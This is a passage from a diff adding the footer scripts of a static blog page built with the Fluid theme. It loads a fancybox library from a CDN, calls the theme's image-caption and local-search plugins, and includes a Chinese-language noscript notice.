+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
